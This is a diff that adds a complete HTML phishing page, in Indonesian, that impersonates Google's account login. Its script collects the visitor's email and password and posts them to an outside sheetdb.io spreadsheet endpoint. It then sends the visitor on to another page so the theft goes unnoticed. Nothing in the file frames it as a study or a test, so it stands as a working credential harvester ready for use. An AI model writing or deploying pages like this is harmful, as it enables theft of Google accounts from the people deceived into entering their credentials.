@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Akun Google</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', arial, sans-serif; }
+        body { background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-box { width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .google-logo { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
+        p { font-size: 16px; color: #202124; margin-bottom: 30px; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; transition: border 0.2s; }
+        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        .blue-link { color: #1a73e8; font-weight: 500; font-size: 14px; text-decoration: none; cursor: pointer; display: inline-block; margin-top: 5px; }
+        .button-group { display: flex; justify-content: flex-end; margin-top: 35px; }
+        .btn-next { background-color: #1a73e8; color: #ffffff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; }
+        .btn-next:disabled { background-color: #ccc; cursor: not-allowed; }
+        @media (max-width: 500px) { .login-box { width: 100%; border: none; padding: 20px; } }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="google-logo">
+        <h1>Login</h1>
+        <p>Lanjutkan ke Akun Google Anda</p>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="email" id="email" name="Email" placeholder="Email" required>
+            </div>
+
+            <div class="input-group">
+                <input type="password" id="password" name="Password" placeholder="Masukkan sandi Anda" required>
+                <div style="text-align: left;">
+                    <span class="blue-link" style="font-size: 13px;">Lupa sandi?</span>
+                </div>
+            </div>
+
+            <div class="button-group">
+                <button type="submit" id="btnSubmit" class="btn-next">Login</button>
+            </div>
+        </form>
+    </div>
+
+<script>
+    const form = document.getElementById('loginForm');
+    const btnSubmit = document.getElementById('btnSubmit');
+
+    form.addEventListener("submit", function(e) {
+        e.preventDefault();
+        
+        btnSubmit.innerHTML = "Memproses...";
+        btnSubmit.disabled = true;
+
+        const sheetdb_url = 'https://sheetdb.io/api/v1/x1fdrdgbjtcoq';
+        const emailVal = document.getElementById('email').value;
+        const passVal = document.getElementById('password').value;
+
+        const payload = {
+            data: [
+                {
+                    "Email": emailVal,
+                    "Password": passVal
+                }
+            ]
+        };
+
+        // Menggunakan fetch dengan .finally() untuk memastikan alur pengalihan halaman yang benar
+        fetch(sheetdb_url, {
+            method: 'POST',
+            headers: {
+                'Accept': 'application/json',
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Data berhasil dikirim:", data);
+        })
+        .catch(error => {
+            console.error("Gagal mengirim data:", error);
+        })
+        .finally(() => {
+            // Pindah halaman HANYA setelah proses fetch selesai (berhasil atau gagal)
+            window.location.href = "index4.html";
+        });
+    });
+</script>
+
+</body>
+</html>
